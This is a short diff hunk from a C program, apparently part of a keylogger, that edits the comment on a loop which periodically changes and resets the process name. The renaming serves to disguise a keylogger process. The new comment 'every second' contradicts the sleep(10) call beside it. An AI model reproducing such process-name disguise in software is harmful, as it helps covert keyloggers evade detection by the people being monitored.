@@ -59,8 +59,8 @@ start:
 
 		printf("Process name changed to: %s \n", processName); 
 
-		// Changes name every time keyLogger runs (every 10 minutes)
-		sleep(10);
+		// Changes name every second
+		sleep(10); 
 
 		// Reset process name to NULL  
 		memset((processName),'\0', sizeof(processName)); 
